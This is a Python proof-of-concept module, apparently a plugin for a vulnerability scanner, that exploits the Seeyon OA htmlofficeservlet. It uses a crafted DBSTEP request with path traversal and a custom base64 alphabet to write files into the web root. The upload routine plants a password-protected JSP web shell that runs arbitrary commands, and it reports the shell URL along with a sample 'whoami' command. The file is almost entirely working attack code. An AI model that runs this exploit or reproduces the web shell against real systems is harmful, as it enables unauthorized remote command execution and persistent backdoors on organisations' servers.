#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import os
import time
import random
from lib.utils.cipher import base64decode
from lib.utils.cipher import base64encode
from lib.core.data import paths
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'seeyon getshell'
        self.keyword = ['seeyon']
        self.info = 'seeyon getshell'
        self.type = 'rce'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)

    def prove(self):

        self.get_url()
        if self.base_url:
            table = 'gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6'
            test_file = 'test' + str(random.randint(100000,999999)) + '.txt'
            base64_file = str(base64encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\{}'.format(test_file),table))
            url = self.base_url + 'seeyon/htmlofficeservlet'
            res = self.curl('get', url)
            if res !=None and 'DBSTEP V3.0' in res.text:
                data = '''DBSTEP V3.0     355             0               22             DBSTEP=OKMLlKlV\r\nOPTION=S3WYOSWLBSGr\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nCREATEDATE=wUghPB3szB3Xwg66\r\nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME={}\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66 \r\nthis is a test for me.f82abdd62cce9d2841a6efd5663e7bee'''.format(base64_file)
                self.curl('post', url, data = data)
                time.sleep(5)
                url1 = self.base_url +  'seeyon/' + test_file

                res = self.curl('get', url1)
                if res!=None and 'this is a test for me' in res.text:
                    self.flag = 1
                    self.res.append({"info": url1, "key": 'seeyon getshell'})


    def upload(self):
        self.get_url()
        if self.base_url:
            table = 'gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6'
            test_file = 'test' + str(random.randint(100000,999999)) + '.jsp'
            base64_file = str(base64encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\{}'.format(test_file),table))
            url = self.base_url + 'seeyon/htmlofficeservlet'
            res = self.curl('get', url)
            if res !=None and 'DBSTEP V3.0' in res.text:
                data = '''DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r\nOPTION=S3WYOSWLBSGr\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nCREATEDATE=wUghPB3szB3Xwg66\r\nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME='''+ base64_file + '''\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("test12345".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>c0a4500844f330626a5f11e1563b03f2'''
                self.curl('post', url, data = data)
                time.sleep(5)
                url1 = self.base_url +  'seeyon/' + test_file
                res = self.curl('get', url1)
                if res!=None and ':-)' in res.text:
                    self.flag = 1
                    self.res.append({"info": url1 +'?pwd=test12345&cmd=whoami', "key": 'seeyon getshell'})